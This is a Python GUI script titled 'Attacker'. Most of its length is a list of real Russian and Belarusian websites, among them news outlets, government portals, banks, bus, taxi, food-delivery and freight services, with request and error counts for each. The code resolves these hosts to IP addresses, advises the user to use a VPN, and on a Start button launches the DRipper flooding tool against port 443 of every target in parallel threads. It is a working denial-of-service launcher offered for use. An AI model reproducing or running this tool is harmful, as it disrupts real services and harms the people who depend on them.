#!/usr/bin/python3
import os
import tkinter as tk
import subprocess, shlex
import threading
import dns.resolver
import random
import pathlib

os.environ["PYTHONUNBUFFERED"] = "1"

d={
	"https://lenta.ru/": {
		"number_of_requests": 571,
		"number_of_errored_responses": 0
	},
	"https://auth.ria.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://ria.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://ria.ru/lenta/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://www.rbc.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://www.rt.com/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"http://kremlin.ru/": {
		"number_of_requests": 73,
		"number_of_errored_responses": 73,
		"error_message": "Failed to fetch"
	},
	"http://en.kremlin.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 68,
		"error_message": "Failed to fetch"
	},
	"https://smotrim.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 0
	},
	"https://tass.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://tvzvezda.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://rbc.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://minzdrav.gov.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"http://government.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 66,
		"error_message": "Failed to fetch"
	},
	"https://www.mchs.gov.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"https://rkn.gov.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"http://www.council.gov.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 68,
		"error_message": "Failed to fetch"
	},
	"https://www.sberbank.ru/en/individualclients": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://kassa.yandex.ru/main-new": {
		"number_of_requests": 61,
		"number_of_errored_responses": 3,
		"error_message": "Not Found"
	},
	"http://www.gosuslugi.ru/ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 67,
		"error_message": "Failed to fetch"
	},
	"https://www.donland.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"http://www.fagci.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 64,
		"error_message": "Failed to fetch"
	},
	"https://digital.gov.ru/ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://www.pochta.ru": {
		"number_of_requests": 68,
		"number_of_errored_responses": 0
	},
	"https://www.vbr.ru/goto?externalLink=https://broker.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://www.aeroflot.com/ru-ru": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://www.vbr.ru/goto?externalLink=https://alfabank.ru/make-money/investments/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://www.rshb.ru": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://www.psbank.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://aversbank.ru/": {
		"number_of_requests": 75,
		"number_of_errored_responses": 0
	},
	"https://www.gazprombank.ru": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://www.akbars.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://www.aton.ru/": {
		"number_of_requests": 75,
		"number_of_errored_responses": 0
	},
	"https://www.open.ru": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://mkb.ru": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://www.tinkoff.ru/invest/account/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://www.pochtabank.ru": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://www.vbrr.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 0
	},
	"https://er.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://russian.rt.com/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://www.tkbbank.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://wagnera.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://www.tinkoff.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://www.rncb.ru": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://www.sberbank.ru/ru/person": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"http://planeradar.ru/virtualradar/desktop.html": {
		"number_of_requests": 65,
		"number_of_errored_responses": 65,
		"error_message": "Failed to fetch"
	},
	"https://broker.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 3,
		"error_message": "Failed to fetch"
	},
	"https://bcs.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 9,
		"error_message": "Failed to fetch"
	},
	"https://im.uralsib.ru/clientendpoint": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://bus.tutu.ru": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://busfor.ru/": {
		"number_of_requests": 71,
		"number_of_errored_responses": 0
	},
	"https://www.blablacar.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 0
	},
	"https://www.avtovokzaly.ru/": {
		"number_of_requests": 74,
		"number_of_errored_responses": 0
	},
	"https://bus-69.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://bus.biletyplus.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 7,
		"error_message": "Failed to fetch"
	},
	"http://78bus.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 69,
		"error_message": "Failed to fetch"
	},
	"https://severnye-vorota.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://busnovoyas.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 3,
		"error_message": "Failed to fetch"
	},
	"https://nevskiy-express.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://autobus-moskva.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 63,
		"error_message": "Failed to fetch"
	},
	"https://ros-bilet.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://xn--d1abb2a.xn--p1ai/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://movibus.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://volgaline34.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://buybusticket.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://donavto.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://rostov-transport.info/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.bustime.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://www.intercars-tickets.com": {
		"number_of_requests": 69,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://rov.aero/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://avtovokzal-volgograd.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 30,
		"error_message": "Failed to fetch"
	},
	"https://www.tourister.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://www.mosgortrans.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"https://www.avokzal.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://ecolines.net/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"https://www.autovokzal.org": {
		"number_of_requests": 60,
		"number_of_errored_responses": 3,
		"error_message": "Failed to fetch"
	},
	"https://www.flixbus.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://tochka-na-karte.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://avtovokzal.gomel.by/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://minsktrans.by/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://kogda.by/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 4,
		"error_message": "Failed to fetch"
	},
	"https://busfor.by/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 6,
		"error_message": "Failed to fetch"
	},
	"https://avgrodno.by/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 60,
		"error_message": "Failed to fetch"
	},
	"https://by.tutu.travel/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 16,
		"error_message": "Failed to fetch"
	},
	"https://minsk-avtovokzal.by/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://ticketbus.by/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://taf.by/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 9,
		"error_message": "Failed to fetch"
	},
	"https://gomel-minsk.by/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://tickets.by/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://star-bus.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://kaktustour.com/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://618.by/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 30,
		"error_message": "Not Found"
	},
	"http://busik24.com/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 61,
		"error_message": "Failed to fetch"
	},
	"https://2y.by/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 35,
		"error_message": "Failed to fetch"
	},
	"https://travel-kassa.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://av.brest.by/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://avtovokzal-mogilev.by/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 3,
		"error_message": "Failed to fetch"
	},
	"https://ecolines.by/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://www.mts.by": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://rosukrbus.com/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://www.moscowbus.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://lavka.yandex.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://salatoff.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://www.delivery-club.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 0
	},
	"https://eda.yandex.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://vlavke.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://av.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 31,
		"error_message": "Failed to fetch"
	},
	"https://www.perekrestok.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://levelkitchen.com/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://m-food.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://ecomarket.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://www.auchan.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.utkonos.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://globusgurme.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://tvoydom.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://www.okeydostavka.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 5,
		"error_message": "Failed to fetch"
	},
	"https://vkusvill.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://tochkamarket.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://zws.moscow/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://4fresh.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 31,
		"error_message": "Failed to fetch"
	},
	"https://familyfriend.com/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 4,
		"error_message": "Failed to fetch"
	},
	"https://moscowfresh.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://zakazaka.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://eda.me/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://localkitchen.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://novikovgroup.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 10,
		"error_message": "Failed to fetch"
	},
	"https://samokat.ru": {
		"number_of_requests": 71,
		"number_of_errored_responses": 0
	},
	"http://www.shop.wolkonsky.com/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 61,
		"error_message": "Failed to fetch"
	},
	"https://freshrestaurant.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://dellos-delivery.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 7,
		"error_message": "Failed to fetch"
	},
	"https://www.yabisiel.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://ilovesakura.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://taxi.yandex.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://city-mobil.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 4,
		"error_message": "Failed to fetch"
	},
	"https://oldtaxi.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.taxi-ritm.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://rutaxi.ru/moscow": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://taksi-moskva24.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://msk.taxovichkof.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://bonus.taxi/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 14,
		"error_message": "Failed to fetch"
	},
	"https://taxicel.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 7,
		"error_message": "Failed to fetch"
	},
	"https://tradetaxi.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://taxireal.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://mo-taxi.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"http://www.formula-taxi.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 63,
		"error_message": "Failed to fetch"
	},
	"https://mostaxi-svao.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://taximaxim.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://nyt.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 4,
		"error_message": "Failed to fetch"
	},
	"https://taximoskvi.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://ct-mobil.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"http://m.taxi/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 60,
		"error_message": "Failed to fetch"
	},
	"https://bigtaxi.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"https://taxi-punkt.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://vse-taxi.com/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://rutaxist.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://taxuber.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://vrn-taxi.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 6,
		"error_message": "Failed to fetch"
	},
	"https://gruzovichkof.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://spb.gazelking.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://pecom.ru/": {
		"number_of_requests": 75,
		"number_of_errored_responses": 0
	},
	"https://www.baikalsr.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://www.avito.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://msk.gruzovichkof.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://gruzosfera.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://kdr.gazelkin.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://podorojnik.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://glavtrassa.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 8,
		"error_message": "Failed to fetch"
	},
	"https://gruzoperevozka78.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://spb-perevozka.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://www.vezetvsem.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://www.perevozim.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://www.dellin.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://xn--b1acccabnir5ahgabbrk.xn--80adxhks/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://gruz.msk.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://dostavista.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://ultra-pereezd.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 0
	},
	"https://ati.su/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://grastin.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://avtoflot.ru/": {
		"number_of_requests": 71,
		"number_of_errored_responses": 37,
		"error_message": "Failed to fetch"
	},
	"https://perevozka24.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://nordw.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://spb.dellin.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://utsr.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://www.gruso-perevozchik.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://vozovoz.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://pognali.su/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://nirax-cargo.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 0
	},
	"https://to-group.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 8,
		"error_message": "Failed to fetch"
	},
	"https://tk-soyz.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://a-groupp.com/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 28,
		"error_message": "Failed to fetch"
	},
	"https://www.s7.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"http://xn----etbhgfabn1ceiwf1d.xn--p1ai/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 62,
		"error_message": "Failed to fetch"
	},
	"https://xn----7sba7aa0aahdfiedhiadh3w.xn--p1ai/": {
		"number_of_requests": 56,
		"number_of_errored_responses": 0
	},
	"https://cargo-express.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 5,
		"error_message": "Failed to fetch"
	},
	"https://atec-logistic.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://magic-trans.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://oooyata.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://spb.ve-zy.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.tlkregion.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://xn----8sbahcht2a7aqpmh.xn--p1ai/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://wblitztrans.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://www.vneshtrans.com/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://www.lkw-walter.com/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://zhdalians.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 0
	},
	"https://xn----9sb2ahmle.xn--p1ai/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://sankt-peterburg.azimut-nsk.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 0
	},
	"https://nevatk.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://piter-cargo.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 0
	},
	"https://perevozka-gruza.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://www.avtotransit.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://socratcargo.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://pogruzivkuzov.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://www.jde.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 5,
		"error_message": "Failed to fetch"
	},
	"https://www.tk-tat.ru/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://transtrek.ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"https://www.tktl.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://sirius-trans.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://garantpost.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"http://vostok-trans.com/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 63,
		"error_message": "Failed to fetch"
	},
	"https://fourways.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 4,
		"error_message": "Failed to fetch"
	},
	"http://logisticgrup.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 61,
		"error_message": "Failed to fetch"
	},
	"https://maestrogruz.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 28,
		"error_message": "Failed to fetch"
	},
	"https://rostov.gruzovichkof.ru/": {
		"number_of_requests": 56,
		"number_of_errored_responses": 0
	},
	"https://tekfortis.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://samcom.ru/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.trado.ru/": {
		"number_of_requests": 56,
		"number_of_errored_responses": 0
	},
	"https://avtoperevozki-rostov.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://rostov-na-donu.vezetvsem.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"https://rostov.blizko.ru/": {
		"number_of_requests": 64,
		"number_of_errored_responses": 0
	},
	"https://www.ata.su/": {
		"number_of_requests": 58,
		"number_of_errored_responses": 0
	},
	"https://www.railcontinent.ru/": {
		"number_of_requests": 57,
		"number_of_errored_responses": 0
	},
	"https://incom-cargo.ru/": {
		"number_of_requests": 56,
		"number_of_errored_responses": 1,
		"error_message": "Failed to fetch"
	},
	"https://logistika-zapad.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://proline.su/": {
		"number_of_requests": 56,
		"number_of_errored_responses": 0
	},
	"https://perevozki.youdo.com/": {
		"number_of_requests": 62,
		"number_of_errored_responses": 0
	},
	"https://tranzit-auto.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	}
}

OptionList = [
"www.rt.com",
"sputniknews.com",
"tass.ru",
"ruptly.tv",
"tvzvezda.ru",
"www.cbr.ru",
"www.kremlin.ru",
"www.vesti.ru",
"www.smotrim.ru",
"www.vgtrk.ru",
"www.politnavigator.net",
"ukraina.ru"
] 

f = [i.replace('https://', '').replace('http://', '').replace('/', '') for i in list(d.keys())[:10]]
OptionList.extend(f)
OptionList=list(set(OptionList))


def get_ip(host):
    resolver = dns.resolver.Resolver()
    ips = list(resolver.query(host, 'A'))
    ip = random.choice(ips)
    return ip.to_text()


app = tk.Tk()
app.title("Attacker")

app.geometry('300x300')

host= tk.StringVar(app)
host.set(OptionList[0])

opt = tk.OptionMenu(app, host, *OptionList)
opt.config(width=90, font=('Helvetica', 12))
opt.pack()

message = tk.StringVar(app)
label = tk.Label(app, textvariable=message)
label.pack()

message.set("Better use vpn before running this app")

text = tk.Text(app, height=5, width=152)

proc = None


def start():
	for hostText in OptionList:
		ip = get_ip(hostText)
		message.set(f"Attacking {hostText} ({ip})")
		current = pathlib.Path(__file__).parent.resolve()
		os.chdir(current)
		cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
		threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True).start()


def stop():
	exit(0)


btn = tk.Button(app, text='Start', bd ='5', command=start)
btn.pack(side = 'top')

btn = tk.Button(app, text='Stop', bd ='5', command=stop)
btn.pack(side = 'top')

text.pack()


app.mainloop()
